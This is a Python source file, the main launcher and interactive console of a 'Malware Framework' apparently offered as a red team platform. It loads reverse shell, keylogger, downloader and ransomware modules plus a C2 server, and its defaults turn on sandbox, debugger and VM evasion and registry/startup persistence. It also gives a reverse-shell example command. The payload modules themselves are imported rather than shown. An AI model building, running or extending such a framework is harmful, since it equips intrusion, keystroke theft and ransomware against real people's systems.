#!/usr/bin/env python3
"""
Malware Framework - Main Entry Point
Advanced Red Team Simulation Platform
"""

import os
import sys
import argparse
import logging
from pathlib import Path
from typing import Dict, Any, Optional
import yaml

# Add framework root to path
sys.path.insert(0, str(Path(__file__).parent))

from core.utils import SystemUtils, FileUtils
from modules.reverse_shell import ReverseShell, TCPShell, HTTPShell
from modules.keylogger import Keylogger
from modules.downloader import Downloader, HTTPDownloader, FTPDownloader
from modules.ransomware import RansomwareSimulator
from c2.tcp_c2 import TCPC2Server

logger = logging.getLogger(__name__)

class MalwareFramework:
    """Main malware framework class"""
    
    def __init__(self, config_path: Optional[str] = None):
        """Initialize malware framework"""
        self.config = self._load_config(config_path)
        self.modules = {}
        self.c2_server = None
        
        # Setup logging
        self._setup_logging()
        
        # Initialize framework
        self._initialize_framework()
    
    def _load_config(self, config_path: Optional[str] = None) -> Dict[str, Any]:
        """Load framework configuration"""
        try:
            if config_path is None:
                config_path = "config/default.yaml"
            
            config_file = Path(config_path)
            if config_file.exists():
                with open(config_file, 'r') as f:
                    config = yaml.safe_load(f)
            else:
                config = self._get_default_config()
            
            return config
        
        except Exception as e:
            logger.error(f"Failed to load config: {e}")
            return self._get_default_config()
    
    def _get_default_config(self) -> Dict[str, Any]:
        """Get default configuration"""
        return {
            'framework': {
                'name': 'Malware Framework',
                'version': '1.0.0',
                'debug': False,
                'stealth_mode': True
            },
            'c2': {
                'protocol': 'tcp',
                'host': '0.0.0.0',
                'port': 4444,
                'encryption': {
                    'enabled': True,
                    'algorithm': 'aes',
                    'key': None
                }
            },
            'stealth': {
                'sandbox_detection': True,
                'debugger_detection': True,
                'vm_detection': True,
                'delay_jitter': 0.3
            },
            'persistence': {
                'enabled': True,
                'methods': ['registry', 'startup'],
                'cleanup': False
            },
            'logging': {
                'level': 'INFO',
                'file': 'logs/framework.log',
                'max_size': '10MB',
                'backup_count': 5
            }
        }
    
    def _setup_logging(self) -> None:
        """Setup framework logging"""
        try:
            log_config = self.config.get('logging', {})
            log_level = getattr(logging, log_config.get('level', 'INFO').upper())
            
            # Create logs directory
            log_dir = Path("logs")
            log_dir.mkdir(exist_ok=True)
            
            # Setup file handler
            log_file = log_config.get('file', 'logs/framework.log')
            file_handler = logging.FileHandler(log_file)
            file_handler.setLevel(log_level)
            
            # Setup console handler
            console_handler = logging.StreamHandler()
            console_handler.setLevel(log_level)
            
            # Create formatter
            formatter = logging.Formatter(
                '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
            )
            file_handler.setFormatter(formatter)
            console_handler.setFormatter(formatter)
            
            # Setup root logger
            root_logger = logging.getLogger()
            root_logger.setLevel(log_level)
            root_logger.addHandler(file_handler)
            root_logger.addHandler(console_handler)
            
            logger.info("Logging setup completed")
        
        except Exception as e:
            print(f"Failed to setup logging: {e}")
    
    def _initialize_framework(self) -> None:
        """Initialize framework components"""
        try:
            # Create necessary directories
            self._create_directories()
            
            # Load modules
            self._load_modules()
            
            logger.info("Framework initialization completed")
        
        except Exception as e:
            logger.error(f"Framework initialization failed: {e}")
    
    def _create_directories(self) -> None:
        """Create necessary directories"""
        directories = [
            "logs",
            "build",
            "downloads",
            "config",
            "data"
        ]
        
        for directory in directories:
            Path(directory).mkdir(exist_ok=True)
    
    def _load_modules(self) -> None:
        """Load available modules"""
        try:
            # Load module configurations
            module_configs = self.config.get('modules', {})
            
            # Register modules
            self.modules = {
                'reverse_shell': {
                    'class': ReverseShell,
                    'config': module_configs.get('reverse_shell', {}),
                    'description': 'TCP/HTTP reverse shell'
                },
                'keylogger': {
                    'class': Keylogger,
                    'config': module_configs.get('keylogger', {}),
                    'description': 'Stealth keylogger'
                },
                'downloader': {
                    'class': Downloader,
                    'config': module_configs.get('downloader', {}),
                    'description': 'File downloader'
                },
                'ransomware': {
                    'class': RansomwareSimulator,
                    'config': module_configs.get('ransomware', {}),
                    'description': 'Ransomware simulator'
                }
            }
            
            logger.info(f"Loaded {len(self.modules)} modules")
        
        except Exception as e:
            logger.error(f"Failed to load modules: {e}")
    
    def list_modules(self) -> None:
        """List available modules"""
        print("\n=== Available Modules ===")
        for name, module_info in self.modules.items():
            print(f"  {name}: {module_info['description']}")
        print()
    
    def run_module(self, module_name: str, **kwargs) -> bool:
        """Run a specific module"""
        try:
            if module_name not in self.modules:
                logger.error(f"Module not found: {module_name}")
                return False
            
            module_info = self.modules[module_name]
            module_class = module_info['class']
            module_config = module_info['config'].copy()
            
            # Update config with kwargs
            module_config.update(kwargs)
            
            # Create and run module
            module = module_class(module_config)
            success = module.start()
            
            if success:
                logger.info(f"Module {module_name} started successfully")
            else:
                logger.error(f"Module {module_name} failed to start")
            
            return success
        
        except Exception as e:
            logger.error(f"Failed to run module {module_name}: {e}")
            return False
    
    def start_c2_server(self) -> bool:
        """Start C2 server"""
        try:
            c2_config = self.config.get('c2', {})
            self.c2_server = TCPC2Server(c2_config)
            
            success = self.c2_server.start()
            
            if success:
                logger.info("C2 server started successfully")
            else:
                logger.error("C2 server failed to start")
            
            return success
        
        except Exception as e:
            logger.error(f"Failed to start C2 server: {e}")
            return False
    
    def stop_c2_server(self) -> None:
        """Stop C2 server"""
        try:
            if self.c2_server:
                self.c2_server.stop()
                self.c2_server = None
                logger.info("C2 server stopped")
        
        except Exception as e:
            logger.error(f"Failed to stop C2 server: {e}")
    
    def get_status(self) -> Dict[str, Any]:
        """Get framework status"""
        return {
            'framework': self.config.get('framework', {}),
            'modules': list(self.modules.keys()),
            'c2_server': self.c2_server.get_status() if self.c2_server else None,
            'system': SystemUtils.get_system_info()
        }

def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description="Malware Framework - Advanced Red Team Simulation Platform",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python main.py --list-modules
  python main.py --module reverse_shell --host 192.168.1.100 --port 4444
  python main.py --c2-server --port 4444
  python main.py --interactive
        """
    )
    
    parser.add_argument(
        '--config', '-c',
        help='Configuration file path'
    )
    
    parser.add_argument(
        '--list-modules', '-l',
        action='store_true',
        help='List available modules'
    )
    
    parser.add_argument(
        '--module', '-m',
        help='Module to run'
    )
    
    parser.add_argument(
        '--host',
        help='Target host (for reverse shell)'
    )
    
    parser.add_argument(
        '--port',
        type=int,
        help='Target port'
    )
    
    parser.add_argument(
        '--c2-server',
        action='store_true',
        help='Start C2 server'
    )
    
    parser.add_argument(
        '--interactive', '-i',
        action='store_true',
        help='Start interactive mode'
    )
    
    parser.add_argument(
        '--debug',
        action='store_true',
        help='Enable debug mode'
    )
    
    args = parser.parse_args()
    
    # Initialize framework
    framework = MalwareFramework(args.config)
    
    # Set debug mode
    if args.debug:
        logging.getLogger().setLevel(logging.DEBUG)
        logger.debug("Debug mode enabled")
    
    try:
        if args.list_modules:
            framework.list_modules()
        
        elif args.module:
            # Run specific module
            module_kwargs = {}
            if args.host:
                module_kwargs['host'] = args.host
            if args.port:
                module_kwargs['port'] = args.port
            
            success = framework.run_module(args.module, **module_kwargs)
            if not success:
                sys.exit(1)
        
        elif args.c2_server:
            # Start C2 server
            success = framework.start_c2_server()
            if not success:
                sys.exit(1)
        
        elif args.interactive:
            # Start interactive mode
            interactive_mode(framework)
        
        else:
            # Show help if no arguments
            parser.print_help()
    
    except KeyboardInterrupt:
        print("\nInterrupted by user")
        framework.stop_c2_server()
    except Exception as e:
        logger.error(f"Framework error: {e}")
        sys.exit(1)

def interactive_mode(framework: MalwareFramework):
    """Interactive mode"""
    print("\n=== Malware Framework Interactive Mode ===")
    print("Type 'help' for available commands")
    print("Type 'quit' to exit")
    print()
    
    while True:
        try:
            command = input("malware> ").strip()
            if not command:
                continue
            
            if command.lower() == 'quit':
                break
            
            elif command.lower() == 'help':
                show_help()
            
            elif command.lower() == 'list':
                framework.list_modules()
            
            elif command.lower() == 'status':
                show_status(framework)
            
            elif command.lower().startswith('run '):
                run_module_command(framework, command[4:])
            
            elif command.lower().startswith('c2 '):
                handle_c2_command(framework, command[3:])
            
            else:
                print("Unknown command. Type 'help' for available commands.")
        
        except KeyboardInterrupt:
            print("\nInterrupted by user")
            break
        except EOFError:
            break
        except Exception as e:
            logger.error(f"Interactive mode error: {e}")
    
    # Cleanup
    framework.stop_c2_server()

def show_help():
    """Show interactive mode help"""
    print("\nAvailable commands:")
    print("  help                    - Show this help")
    print("  list                    - List available modules")
    print("  status                  - Show framework status")
    print("  run <module> [options]  - Run a module")
    print("  c2 start                - Start C2 server")
    print("  c2 stop                 - Stop C2 server")
    print("  c2 status               - Show C2 server status")
    print("  quit                    - Exit interactive mode")
    print()

def show_status(framework: MalwareFramework):
    """Show framework status"""
    status = framework.get_status()
    
    print("\n=== Framework Status ===")
    print(f"Name: {status['framework'].get('name', 'Unknown')}")
    print(f"Version: {status['framework'].get('version', 'Unknown')}")
    print(f"Modules: {', '.join(status['modules'])}")
    
    if status['c2_server']:
        c2_status = status['c2_server']
        print(f"C2 Server: {c2_status['host']}:{c2_status['port']}")
        print(f"Connected Clients: {c2_status['connected_clients']}")
    else:
        print("C2 Server: Not running")
    
    print()

def run_module_command(framework: MalwareFramework, command: str):
    """Handle run module command"""
    try:
        parts = command.split()
        if not parts:
            print("Usage: run <module> [options]")
            return
        
        module_name = parts[0]
        options = parts[1:]
        
        # Parse options
        module_kwargs = {}
        for option in options:
            if '=' in option:
                key, value = option.split('=', 1)
                module_kwargs[key] = value
            else:
                module_kwargs[option] = True
        
        # Run module
        success = framework.run_module(module_name, **module_kwargs)
        if success:
            print(f"Module {module_name} started successfully")
        else:
            print(f"Failed to start module {module_name}")
    
    except Exception as e:
        logger.error(f"Failed to run module command: {e}")

def handle_c2_command(framework: MalwareFramework, command: str):
    """Handle C2 server command"""
    try:
        parts = command.split()
        if not parts:
            print("Usage: c2 <start|stop|status>")
            return
        
        action = parts[0].lower()
        
        if action == 'start':
            success = framework.start_c2_server()
            if success:
                print("C2 server started")
            else:
                print("Failed to start C2 server")
        
        elif action == 'stop':
            framework.stop_c2_server()
            print("C2 server stopped")
        
        elif action == 'status':
            if framework.c2_server:
                status = framework.c2_server.get_status()
                print(f"C2 Server: {status['host']}:{status['port']}")
                print(f"Running: {status['running']}")
                print(f"Connected Clients: {status['connected_clients']}")
            else:
                print("C2 server not running")
        
        else:
            print("Unknown C2 command. Use: start, stop, or status")
    
    except Exception as e:
        logger.error(f"Failed to handle C2 command: {e}")

if __name__ == "__main__":
    main() 